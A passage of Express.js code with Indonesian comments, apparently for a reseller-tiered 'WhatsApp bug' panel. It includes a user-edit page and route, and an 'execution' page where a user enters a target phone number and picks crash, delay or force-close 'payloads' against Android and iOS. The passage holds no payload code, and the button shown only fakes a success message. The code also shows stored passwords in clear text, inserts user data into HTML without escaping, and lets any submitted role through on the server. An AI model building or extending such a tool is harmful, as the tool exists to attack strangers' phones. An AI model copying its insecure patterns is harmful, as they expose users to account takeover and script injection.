  if (role === "owner") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${targetUser.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${targetUser.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${targetUser.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${targetUser.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${targetUser.role}" selected>${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((targetUser.expired - now) / 86400000));
  const expiredText = new Date(targetUser.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  // HTML form edit user dengan tombol yang sudah dirapihin untuk mobile
  const html = `
  <!DOCTYPE html>
  <html lang="id">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Edit User - DIGITAL CORE</title>
    <link rel="icon" href="https://files.catbox.moe/yn6erv.jpg" type="image/jpg">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
    <style>
      * {
        * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        -webkit-tap-highlight-color: transparent;
      }

      body {
        font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'SF Pro Display', 'Helvetica Neue', Arial, sans-serif;
        background: linear-gradient(135deg, #1a1a1a 0%, #000000 100%);
        color: #FFFFFF;
        min-height: 100vh;
        padding: 20px;
        display: flex;
        justify-content: center;
        align-items: center;
        overflow-x: hidden;
      }

      /* Latar belakang partikel tetap di belakang */
      #particles {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 0;
      }

      .content {
        position: relative;
        z-index: 2;
        width: 100%;
        max-width: 420px; /* Lebar khas layar iPhone */
        margin: 0 auto;
      }

      .header {
        text-align: center;
        margin-bottom: 25px;
      }

      .header h2 {
        font-weight: 600;
        font-size: 28px;
        letter-spacing: -0.5px;
        color: #FFFFFF;
        margin-bottom: 8px;
      }

      .header p {
        color: rgba(255, 255, 255, 0.6);
        font-size: 15px;
      }

      /* EFEK GLASS IPHONE */
      .form-container {
        background: rgba(40, 40, 40, 0.4);
        backdrop-filter: blur(20px) saturate(180%);
        -webkit-backdrop-filter: blur(20px) saturate(180%);
        border: 1px solid rgba(255, 255, 255, 0.1);
        padding: 24px;
        border-radius: 30px; /* Sangat bulat khas iOS */
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
      }

      .user-info {
        background: rgba(255, 255, 255, 0.05);
        padding: 16px;
        border-radius: 18px;
        margin-bottom: 24px;
        border: 1px solid rgba(255, 255, 255, 0.05);
      }

      .info-row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 10px;
        font-size: 14px;
      }

      .info-label {
        color: rgba(255, 255, 255, 0.5);
      }

      .info-value {
        color: #FFFFFF;
        font-weight: 500;
      }

      /* BADGE STYLE iOS */
      .role-badge {
        display: inline-block;
        padding: 4px 12px;
        border-radius: 10px;
        font-size: 11px;
        font-weight: 600;
        letter-spacing: 0.5px;
      }

      .role-owner { background: #FFD60A; color: #000; }
      .role-admin { background: #FF453A; color: #fff; }
      .role-reseller { background: #32D74B; color: #000; }
      .role-user { background: #0A84FF; color: #fff; }

      .form-group {
        margin-bottom: 20px;
      }

      label {
        display: block;
        margin-left: 4px;
        margin-bottom: 8px;
        font-weight: 500;
        color: rgba(255, 255, 255, 0.8);
        font-size: 13px;
      }

      /* INPUT GLASS STYLE */
      input, select {
        width: 100%;
        padding: 14px 16px;
        border-radius: 14px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        background: rgba(255, 255, 255, 0.08);
        color: #FFFFFF;
        font-size: 16px; /* Mencegah auto-zoom di iPhone */
        transition: background 0.3s ease;
      }

      input:focus, select:focus {
        outline: none;
        background: rgba(255, 255, 255, 0.15);
        border-color: rgba(255, 255, 255, 0.3);
      }

      .expired-info {
        background: rgba(255, 69, 58, 0.1);
        padding: 12px;
        border-radius: 12px;
        font-size: 13px;
        color: #FF453A;
        text-align: center;
        margin-bottom: 20px;
      }

      /* BUTTONS iOS STYLE */
      .button-group {
        display: flex;
        flex-direction: column;
        gap: 12px;
      }

      .btn {
        width: 100%;
        padding: 16px;
        border: none;
        border-radius: 16px;
        font-weight: 600;
        font-size: 16px;
        cursor: pointer;
        transition: transform 0.2s active, opacity 0.2s;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }

      .btn:active {
        transform: scale(0.97);
      }

      .btn-save {
        background: #FFFFFF;
        color: #000000;
      }

      .btn-delete {
        background: rgba(255, 69, 58, 0.15);
        color: #FF453A;
        border: 1px solid rgba(255, 69, 58, 0.3);
      }

      .btn-back {
        background: transparent;
        color: #0A84FF; /* Blue khas iOS */
        margin-top: 8px;
      }

      .permission-note {
        text-align: center;
        font-size: 12px;
        color: rgba(255, 255, 255, 0.4);
        margin-top: 20px;
        line-height: 1.5;
      }

      /* RESPONSIVE DESKTOP */
      @media (min-width: 768px) {
        .button-group {
          flex-direction: row;
          flex-wrap: wrap;
        }
        .btn { flex: 1; }
        .btn-back { flex-basis: 100%; }
      }

      /* ANIMASI HALUS */
      @keyframes glassIn {
        from { opacity: 0; transform: scale(0.95); }
        to { opacity: 1; transform: scale(1); }
      }

      .form-container {
        animation: glassIn 0.5s cubic-bezier(0.2, 0.8, 0.2, 1);
      }
    </style>
  </head>
  <body>
    <!-- Efek Partikel -->
    <div id="particles"></div>

    <div class="content">
      <div class="header">
        <h2><i class="fas fa-edit"></i> EDIT USER</h2>
        <p>Manage user account and permissions</p>
      </div>

      <div class="form-container">
        <!-- User Information -->
        <div class="user-info">
          <div class="info-row">
            <span class="info-label">Current Username:</span>
            <span class="info-value">${targetUser.username}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Current Role:</span>
            <span class="info-value">
              <span class="role-badge role-${targetUser.role}">
                ${targetUser.role.charAt(0).toUpperCase() + targetUser.role.slice(1)}
              </span>
            </span>
          </div>
          <div class="info-row">
            <span class="info-label">Expiration:</span>
            <span class="info-value">${expiredText}</span>
          </div>
          <div class="info-row">
            <span class="info-label">Days Remaining:</span>
            <span class="info-value ${sisaHari <= 7 ? 'warning-text' : ''}">${sisaHari} days</span>
          </div>
        </div>

        <form method="POST" action="/edituser">
          <input type="hidden" name="oldusername" value="${targetUser.username}">
          
          <div class="form-group">
            <label for="username"><i class="fas fa-user"></i> Username</label>
            <input type="text" id="username" name="username" value="${targetUser.username}" required>
          </div>

          <div class="form-group">
            <label for="password"><i class="fas fa-key"></i> Password / Key</label>
            <input type="text" id="password" name="password" value="${targetUser.key}" required>
          </div>

          <div class="form-group">
            <label for="extend"><i class="fas fa-calendar-plus"></i> Extend Duration (Days)</label>
            <input type="number" id="extend" name="extend" min="0" max="365" placeholder="0" value="0">
          </div>

          <div class="form-group">
            <label for="role"><i class="fas fa-shield-alt"></i> Role</label>
            <select id="role" name="role" ${role === 'reseller' ? 'disabled' : ''}>
              ${roleOptions}
            </select>
            ${role === 'reseller' ? '<input type="hidden" name="role" value="' + targetUser.role + '">' : ''}
          </div>

          <!-- PERBAIKAN: TOMBOL DALAM CONTAINER YANG SAMA -->
          <div class="button-group">
            <button type="submit" class="btn btn-save">
              <i class="fas fa-save"></i> SAVE CHANGES
            </button>

            <form method="POST" action="/hapususer" style="display: contents;">
              <input type="hidden" name="username" value="${targetUser.username}">
              <button type="submit" class="btn btn-delete" onclick="return confirm('Are you sure you want to delete user ${targetUser.username}?')">
                <i class="fas fa-trash"></i> DELETE USER
              </button>
            </form>

            <a href="/userlist" class="btn btn-back">
              <i class="fas fa-arrow-left"></i> BACK TO USER LIST
            </a>
          </div>
        </form>
      </div>
    </div>

    <!-- JS Partikel -->
    <script>
      $(document).ready(function() {
        $('#particles').particleground({
          dotColor: '#333333',
          lineColor: '#555555',
          minSpeedX: 0.1,
          maxSpeedX: 0.3,
          minSpeedY: 0.1,
          maxSpeedY: 0.3,
          density: 8000,
          particleRadius: 2,
          curvedLines: false,
          proximity: 100
        });
      });

      // Update role badge when role select changes
      document.getElementById('role')?.addEventListener('change', function() {
        const role = this.value;
        const badge = document.querySelector('.role-badge');
        if (badge) {
          badge.className = \`role-badge role-\${role}\`;
          badge.textContent = role.charAt(0).toUpperCase() + role.slice(1);
        }
      });

      // Add confirmation for delete
      document.querySelector('.btn-delete')?.addEventListener('click', function(e) {
        if (!confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
          e.preventDefault();
        }
      });
    </script>
  </body>
  </html>
  `;
  res.send(html);
});

// Tambahkan ini setelah route GET /edituser
app.post("/edituser", requireAuth, (req, res) => {
  const username = req.cookies.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  
  if (!currentUser) {
    return res.redirect("/login?msg=User tidak ditemukan");
  }

  const sessionRole = currentUser.role || 'user';
  const sessionUsername = username;
  const { oldusername, username: newUsername, password, role, extend } = req.body;

  // Validasi input
  if (!oldusername || !newUsername || !password || !role) {
    return res.send("❌ Semua field harus diisi.");
  }

  // Cari user yang akan diedit
  const targetUserIndex = users.findIndex(u => u.username === oldusername);
  if (targetUserIndex === -1) {
    return res.send("❌ User tidak ditemukan.");
  }

  const targetUser = users[targetUserIndex];

  // 🔒🔒🔒 PROTEKSI AKSES YANG LEBIH KETAT 🔒🔒🔒
  
  // 1. Tidak bisa edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  // 2. Reseller hanya boleh edit user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  // 3. Admin tidak boleh edit admin lain ATAU owner
  if (sessionRole === "admin") {
    if (targetUser.role === "admin") {
      return res.send("❌ Admin tidak bisa edit admin lain.");
    }
    if (targetUser.role === "owner") {
      return res.send("❌ Admin tidak bisa edit owner.");
    }
  }

  // 4. Owner bisa edit semua kecuali diri sendiri (sudah dicek di atas)

  // Update data user
  users[targetUserIndex] = {
    ...users[targetUserIndex],
    username: newUsername,
    key: password,
    role: role
  };

  // Tambah masa aktif jika ada
  if (extend && parseInt(extend) > 0) {
    users[targetUserIndex].expired += parseInt(extend) * 86400000;
  }

  saveUsers(users);
  
  // Redirect ke userlist dengan pesan sukses
  res.redirect("/userlist?msg=User " + newUsername + " berhasil diupdate");
});

app.get("/logout", (req, res) => {
  res.clearCookie("sessionUser");
  res.redirect("/login");
});

app.listen(PORT, () => {
  console.log(`✓ Server aktif di port ${PORT}`);
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};


// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  // Bug types data - Simplified titles
  const bugTypes = [
    {
      id: 'delay',
      icon: '<i class="fas fa-hourglass-half"></i>',
      title: '50% Delay'
    },
    {
      id: 'medium',
      icon: '<i class="fas fa-tachometer-alt"></i>',
      title: '100% Delay'
    },
    {
      id: 'blank-ios',
      icon: '<i class="fab fa-apple"></i>',
      title: 'iPhone Hard'
    },
    {
      id: 'crash',
      icon: '<i class="fab fa-android"></i>',
      title: 'Crash Android'
    },
    {
      id: 'fcinvsios',
      icon: '<i class="fas fa-eye-slash"></i>',
      title: 'Invisible iOS'
    },
    {
      id: 'force-close',
      icon: '<i class="fas fa-power-off"></i>',
      title: 'Force Close'
    }
  ];

  return `<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Miyako V2 - Cyberpunk Neural Link</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --bg-body: #050505;
            --card-bg: rgba(13, 13, 13, 0.9);
            --neon-cyan: #00f0ff;
            --neon-magenta: #ff003c;
            --cyber-yellow: #fcee0a;
            --text-white: #ffffff;
            --text-gray: #a5a5a5;
            --glow-cyan: 0 0 10px rgba(0, 240, 255, 0.5);
            --glow-magenta: 0 0 15px rgba(255, 0, 60, 0.6);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }

        body {
            background-color: var(--bg-body);
            color: var(--text-white);
            display: flex;
            justify-content: center;
            min-height: 100vh;
            padding: 15px;
            padding-bottom: 110px; 
            overflow-y: auto;
            /* Efek Garis Monitor CRT */
            background-image: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                              linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            background-size: 100% 4px, 3px 100%;
        }

        /* Glitch Animation Overlay */
        body::after {
            content: " ";
            display: block;
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: rgba(18, 16, 16, 0.1);
            opacity: 0;
            z-index: 100;
            pointer-events: none;
            animation: flicker 0.15s infinite;
        }

        @keyframes flicker {
            0% { opacity: 0.27; }
            100% { opacity: 0.3; }
        }

        .container {
            width: 100%;
            max-width: 420px;
            display: flex;
            flex-direction: column;
            gap: 18px;
            position: relative;
            z-index: 10;
        }

        /* --- PROFILE (Cyberpunk Style) --- */
        .profile-section {
            background: var(--card-bg);
            padding: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid var(--neon-cyan);
            clip-path: polygon(0 0, 100% 0, 100% 70%, 95% 100%, 0 100%);
            box-shadow: var(--glow-cyan);
        }
        .user-info { display: flex; align-items: center; gap: 12px; }
        .avatar { 
            width: 52px; height: 52px; 
            border: 2px solid var(--neon-magenta); 
            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
            object-fit: cover; 
        }
        .username { font-family: 'Orbitron', sans-serif; font-weight: 700; color: var(--neon-cyan); text-transform: uppercase; letter-spacing: 1px; }
        .badge { background: var(--neon-magenta); color: white; font-size: 0.6rem; padding: 2px 8px; font-weight: 900; clip-path: skewX(-15deg); }

        /* --- BANNER --- */
        .video-banner {
            width: 100%;
            height: 140px;
            overflow: hidden;
            position: relative;
            border: 1px solid var(--cyber-yellow);
            clip-path: polygon(0 15%, 5% 0, 100% 0, 100% 85%, 95% 100%, 0 100%);
        }
        .video-banner img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(0.5) contrast(1.2) sepia(0.2) hue-rotate(280deg); }
        .banner-title { 
            position: absolute; bottom: 10px; right: 15px; 
            font-family: 'Orbitron', sans-serif; font-size: 1rem; 
            color: var(--cyber-yellow); background: rgba(0,0,0,0.8);
            padding: 5px 10px; border-left: 4px solid var(--neon-magenta);
        }

        /* --- INPUT CARD --- */
        .input-card {
            background: #000;
            border: 1px solid var(--neon-cyan);
            position: relative;
        }
        .card-label { 
            background: var(--neon-cyan); color: #000; 
            padding: 5px 15px; font-family: 'Orbitron', sans-serif; 
            font-size: 0.7rem; font-weight: 900; 
            display: inline-block; clip-path: polygon(0 0, 100% 0, 85% 100%, 0 100%);
        }
        .card-content { padding: 12px 18px; display: flex; align-items: center; gap: 15px; }
        .card-content input { 
            background: transparent; border: none; color: var(--cyber-yellow); 
            width: 100%; outline: none; font-size: 1.2rem; font-family: 'Orbitron';
        }
        .card-content i { color: var(--neon-cyan); text-shadow: 0 0 5px var(--neon-cyan); }

        /* --- BUG GRID --- */
        .bug-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        .bug-card {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(0, 240, 255, 0.2);
            padding: 15px 10px;
            text-align: center;
            cursor: pointer;
            transition: 0.3s;
            clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%);
        }
        .bug-card:hover { border-color: var(--neon-cyan); background: rgba(0, 240, 255, 0.1); }
        .bug-card.selected {
            background: var(--neon-magenta);
            border: 1px solid var(--cyber-yellow);
            box-shadow: var(--glow-magenta);
            transform: scale(1.05);
        }
        .bug-card i { font-size: 1.5rem; margin-bottom: 8px; color: var(--neon-cyan); }
        .bug-card.selected i { color: white; text-shadow: 0 0 10px white; }
        .bug-card h3 { font-size: 0.7rem; font-family: 'Orbitron'; color: var(--text-gray); }
        .bug-card.selected h3 { color: white; }

        /* --- EXECUTE BUTTON --- */
        .execute-btn {
            background: transparent;
            color: var(--cyber-yellow);
            border: 2px solid var(--cyber-yellow);
            padding: 18px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 900;
            cursor: pointer;
            width: 100%;
            text-transform: uppercase;
            position: relative;
            clip-path: polygon(0 0, 95% 0, 100% 30%, 100% 100%, 5% 100%, 0 70%);
            transition: 0.3s;
        }
        .execute-btn:hover {
            background: var(--cyber-yellow);
            color: #000;
            box-shadow: 0 0 20px var(--cyber-yellow);
        }
        .execute-btn:active { transform: translateY(2px); }

        /* --- POPUP --- */
        .overlay-popup {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); backdrop-filter: blur(8px);
            display: none; justify-content: center; align-items: center; z-index: 10000;
        }
        .popup-card {
            background: #000; border: 2px solid var(--neon-cyan);
            padding: 30px; border-radius: 0; text-align: center;
            width: 85%; max-width: 350px; 
            clip-path: polygon(0 10%, 10% 0, 100% 0, 100% 90%, 90% 100%, 0 100%);
            box-shadow: var(--glow-cyan);
        }
        .btn-close {
            margin-top: 20px; background: var(--neon-cyan); border: none; 
            padding: 12px; color: #000; font-weight: 900; width: 100%; font-family: 'Orbitron';
            clip-path: polygon(0 0, 100% 0, 90% 100%, 10% 100%);
        }

        /* --- NAVIGATION --- */
        .bottom-nav {
            position: fixed; bottom: 0; left: 0; width: 100%; height: 75px;
            background: rgba(0,0,0,0.95); border-top: 2px solid var(--neon-magenta);
            display: flex; justify-content: space-around; align-items: center; z-index: 1500;
        }
        .nav-item-bottom {
            display: flex; flex-direction: column; align-items: center; gap: 4px;
            color: var(--text-gray); text-decoration: none; transition: 0.3s;
        }
        .nav-item-bottom.active { color: var(--neon-cyan); text-shadow: 0 0 8px var(--neon-cyan); }
        .nav-item-bottom i { font-size: 20px; }
        .nav-item-bottom span { font-size: 9px; font-family: 'Orbitron'; text-transform: uppercase; }
    </style>
</head>
<body>

    <div class="container">
        <header class="profile-section">
            <div class="user-info">
                <img src="https://g.top4top.io/p_3645gubs91.jpg" class="avatar" alt="pfp">
                <div>
                    <div class="username">${username}</div>
                    <span class="badge">PRO_LINK_ACTIVE</span>
                </div>
            </div>
            <div class="expiry-box">
                <span style="font-size:0.55rem; color:var(--neon-magenta); display:block; font-weight:900; text-align: right;">SECURE_TIL</span>
                <span style="font-family:'Orbitron'; font-size:0.7rem; color:var(--cyber-yellow);">27/12/2025</span>
            </div>
        </header>

        <div class="video-banner">
            <img src="https://g.top4top.io/p_3645gubs91.jpg" alt="banner">
            <div class="banner-title">EXECUTION_V.3.0</div>
        </div>

        <div class="input-card">
            <div class="card-label">TARGET_ENTRY</div>
            <div class="card-content">
                <i class="fas fa-mobile-alt"></i>
                <input type="number" id="numberInput" placeholder="62XXXXXXXXX">
            </div>
        </div>

        <div style="font-family: 'Orbitron'; font-size: 0.7rem; color: var(--neon-cyan); font-weight: 700; letter-spacing: 2px;">/ PAYLOAD_SELECTION</div>
        <div class="bug-grid" id="bugGrid"></div>

        <button id="executeBtn" class="execute-btn">
            <i class="fas fa-skull"></i> INITIALIZE_EXPLOIT
        </button>
        
        <div style="height: 10px;"></div>
    </div>
    
    <nav class="bottom-nav">
        <a href="/dashboard" class="nav-item-bottom"><i class="fa-solid fa-home"></i><span>Home</span></a>
        <a href="/execution" class="nav-item-bottom active"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
        <a href="/tools" class="nav-item-bottom"><i class="fa-solid fa-tools"></i><span>Tools</span></a>
        <a href="/anime" class="nav-item-bottom"><i class="fa-solid fa-film"></i><span>Anime</span></a>
    </nav>

    <div id="overlayPopup" class="overlay-popup">
        <div class="popup-card" id="popupCard">
            <i id="popupIcon" class="fas fa-radiation" style="font-size: 3rem; color: var(--neon-magenta); margin-bottom: 15px;"></i>
            <h2 id="popupTitle" style="font-family: 'Orbitron'; margin-bottom: 10px; color: var(--neon-cyan); font-size: 1.2rem;">SYSTEM_ERR</h2>
            <p id="popupMsg" style="font-size: 0.9rem; color: var(--text-gray); line-height: 1.4;"></p>
            <button id="popupActionBtn" class="btn-close">EXECUTION_SUCCES</button>
        </div>
    </div>

    <script>
        // --- DATA ASLI TETAP SAMA ---
        const bugTypes = [
            { id: 'delay', icon: 'fa-hourglass-start', title: 'DELAY MEDIUM' },
            { id: 'medium', icon: 'fa-microchip', title: 'DELAY HARD' },
            { id: 'blank-ios', icon: 'fa-apple', title: 'IOS VISIBLE' },
            { id: 'crash', icon: 'fa-android', title: 'CRASH ANDRO' },
            { id: 'fcinvsios', icon: 'fa-ghost', title: 'IOS INVISIBLE' },
            { id: 'force-close', icon: 'fa-skull-crossbones', title: 'FORCE CLOSE' }
        ];

        let selectedBugId = null;
        const bugGrid = document.getElementById('bugGrid');
        const overlay = document.getElementById('overlayPopup');
        const numberInput = document.getElementById('numberInput');

        // --- FUNGSI ASLI TETAP SAMA ---
        function showPopup(title, msg, icon = 'fa-shield-virus', isSuccess = false) {
            document.getElementById('popupTitle').innerText = title;
            document.getElementById('popupMsg').innerHTML = msg;
            document.getElementById('popupIcon').className = \`fas \${icon}\`;
            overlay.style.display = 'flex';
            
            document.getElementById('popupActionBtn').onclick = () => {
                overlay.style.display = 'none';
                if(isSuccess) resetForm();
            };
        }

        function resetForm() {
            numberInput.value = '';
            selectedBugId = null;
            document.querySelectorAll('.bug-card').forEach(c => c.classList.remove('selected'));
        }

        // --- RENDER GRID ---
        bugTypes.forEach(bug => {
            const card = document.createElement('div');
            card.className = 'bug-card';
            card.innerHTML = \`
                <i class="fas \${bug.icon}"></i>
                <h3>\${bug.title}</h3>
            \`;
            
            card.onclick = () => {
                document.querySelectorAll('.bug-card').forEach(c => c.classList.remove('selected'));
                card.classList.add('selected');
                selectedBugId = bug.id;
                if (window.navigator.vibrate) window.navigator.vibrate(20); // Vibrate lebih kuat ala cyberpunk
            };
            bugGrid.appendChild(card);
        });

        // --- EXECUTE LOGIC ---
        document.getElementById('executeBtn').onclick = async function() {
            const number = numberInput.value;
            const btn = this;

            if(!number) {
                showPopup("AUTH_REQUIRED", "Target neural address is missing!", "fa-user-slash");
                return;
            }
            if(!selectedBugId) {
                showPopup("PAYLOAD_NULL", "Select a valid exploit package!", "fa-box-open");
                return;
            }

            btn.disabled = true;
            btn.style.borderColor = "var(--neon-magenta)";
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> UPLOADING_MALWARE...';

            setTimeout(() => {
                const msg = \`Payload <b style="color:var(--neon-magenta)">\${selectedBugId.toUpperCase()}</b> successfully injected into host:<br><span style="color:var(--cyber-yellow); font-size:1.1rem; font-family:Orbitron">\${number}</span>\`;
                showPopup("EXPLOIT_SENT", msg, "fa-check-double", true);
                
                btn.innerHTML = '<i class="fas fa-skull"></i> INITIALIZE_EXPLOIT';
                btn.style.borderColor = "var(--cyber-yellow)";
                btn.disabled = false;
            }, 2500);
        };
    </script>
</body>
</html>`;
};